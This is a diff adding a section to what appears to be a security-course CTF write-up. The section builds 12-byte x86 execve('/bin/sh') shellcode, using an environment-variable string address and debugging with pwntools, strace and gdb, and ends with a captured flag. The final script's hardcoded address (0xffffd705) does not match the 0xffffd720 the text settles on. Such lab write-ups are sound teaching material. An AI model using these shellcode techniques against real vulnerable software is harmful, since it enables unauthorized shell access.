@@ -10,6 +10,9 @@
     - [Full Script + Solve](#full-script--solve-2)
   - [nonzero-shellcode-64](#nonzero-shellcode-64)
     - [Full Script + Solve](#full-script--solve-3)
+- [Short Shellcode](#short-shellcode)
+  - [short-shellcode-32](#short-shellcode-32)
+    - [Full Script + Solve](#full-script--solve-4)
  
 # Writing Shellcode
 This is going to be an overview of a handful of the shellcode-based challenges
@@ -389,10 +392,182 @@ main:
     syscall
 ```
 ```
-./nonzero-shellcode-64
+
+$ ./nonzero-shellcode-64
 Reading shellcode from shellcode.bin
 
 $ cat flag
 cand{n0_puSh_bUt_CLTD}
+$
+```
+
+# Short Shellcode
+We have to be aware of the length of our shellcode because space is limited when working with overflows. The goal of these 
+The challenge was to make our code as short as possible with a hard limit of 12 bytes. To make this a little easier, we only had
+to run `execve("//bin/sh", 0, 0)` as the program set the regid for us. 
+
+## short-shellcode-32
+Again, we can use our code from a previous challenge as a starting point. This time, we'll use the code from `nonzero-shellcode-32`. 
+
+```gas
+    // execve("/bin/sh", 0, 0)
+    xor %eax, %eax
+    push %eax
+    mov %eax, %ecx
+    mov %eax, %edx
+    push $0x68732f6e
+    push $0x69622f2f
+    push $SYS_execve
+    pop %eax
+    mov %esp, %ebx
+    int $0x80
+```
+
+When compiled, we can see it takes up 24 bytes, so we need to cut it in half. 
+
+```
+$ xxd shellcode.bin
+00000000: 31c0 5089 c189 c268 6e2f 7368 682f 2f62  1.P....hn/shh//b
+00000010: 696a 0b58 89e3 cd80                      ij.X....
+```
+
+One of the first things that we can change is the zero-ing of `%edx`. The `cltd` command sign-extends `%eax` into `%edx` and only takes one byte 
+(as opposed to the two-byte `mov`). We just need to make sure that the MSB of `%eax ` is 0. 
+
+```gas
+// ececve("/bin/sh", 0, 0)
+push $SYS_execve
+pop %eax
+cltd
+push %edx
+push $0x68732f6e
+push $0x69622f2f
+mov %esp, %ebx
+mov %edx, %ecx
+int $0x80
+```
+
+Now the script takes 21 bytes. While this is certainly better, it's a far cry from where we need to be. 
+The piece that takes up the most space is putting `//bin/sh` onto the stack. The string itself takes up 
+8 bytes, 2/3 of what we're allowed. 
+
+I moved the string out of the code by putting it into the environment variables. These variables are pushed onto
+the stack at the beginning of execution, so they can be accessed the same as any other variable. The key difference is that they're 
+declared in the terminal rather than in the code. 
+
+```sh
+$ export SHELL="//bin/sh"
+```
+
+I used pwntools' `stack.find()` function to get a ballpark of the address of the string. Note that to test with `short-shellcode-32` I had to remove
+certain parts of the code (namely setting `%ecx`) to get to the 12-byte limit. 
+
+```py
+#!/usr/bin/python3
+
+from pwn import *
+
+c = Core('./core.1498311')
+
+addr = c.stack.find(b"//bin/sh")
+
+print("shellcode at 0x%08x" % addr)
+```
+```
+$ python3 p.py
+[+] Parsing corefile...: Done
+[*] '/home/sawyeras/week3/short-shellcode-32/core.1502266'
+    Arch:      i386-32-little
+    EIP:       0xf7fbd00d
+    ESP:       0xffffd4bc
+    Exe:       '/home/labs/week3/short-shellcode-32/short-shellcode-32' (0x8048000)
+shellcode at 0xffffd720
+```
+
+Once I had the correct address, I could hardcode it. 
+
+```gas
+mov $0xffffd720, %ebx
+```
+
+Then we can use `strace` to quickly see whether or not it's working correctly. 
+
+```
+$ strace ./short-shellcode-32
+...
+execve("HELL=//bin/sh", 0xa, NULL)      = -1 ENOENT (No such file or directory)
+--- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
+```
+
+We can see that the address `find()` gave us isn't quite right, but that can be fixed by increasing the address by 5. When we run it again, the string
+shows up as expected. 
+
+```
+$ strace ./short-shellcode-32
+...
+execve("//bin/sh", 0xa, NULL)      = -1 ENOENT (No such file or directory)
+--- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
+```
+
+Now our code (when properly setting `%ecx`) is 13 bytes. To shave off that one last byte, we can take advantage of the shortened opcodes for
+`%eax`. One of these is that an 8-bit move to `%eax` is a single byte. This means that we can change our two byte `push/pop` into a one byte `mov`. 
+And because it's only an 8-bit move, we don't have to worry about `$SYS_execve` being padded and adding any null bytes. 
+
+```
+mov $SYS_execve, %al
+```
+
+Now when we test with `strace` we can see the shell being created. 
+
+```
+$ strace ./short-shellcode-32
+...
+execve("//bin/sh", NULL, NULL)          = 0
+```
+
+When we try to run `short-shellcode-32` directly, however, it doesn't work. 
+
+```
+$ ./short-shellcode-32
+Reading shellcode from shellcode.bin
+Trace/breakpoint trap (core dumped)
+```
+
+To figure out what's going wrong, we can look at the core dump in `gdb`. 
+
+```
+$ gdb ./short-shellcode-32 core.1502795
+...
+ EAX  0xfffffffe
+ EBX  0xffffd725 ◂— 0x68732f /* '/sh' */
+ ECX  0
+ EDX  0
+...
+```
+
+Quickly, we see that `%ebx` isn't being set properly. In fact, `find()` *was* giving us the correct address and it was `strace` that was 
+messing with the value. Once we change the address back to `0xffffd720`, it all works as intended. 
+
+### Full Script + Solve
+```gas
+#include <sys/syscall.h>
+
+.globl main
+.type main, @function
+
+main:
+    // execve("/bin/sh", 0, 0)
+    mov $SYS_execve, %al
+    cltd
+    mov $0xffffd705, %ebx
+    mov %edx, %ecx
+    int $0x80
+```
+```
+$ ./short-shellcode-32
+Reading shellcode from shellcode.bin
+
+$ cat flag
+cand{HoW_m4ny_byt3s_d0_y0u_need?}
 $
 ```
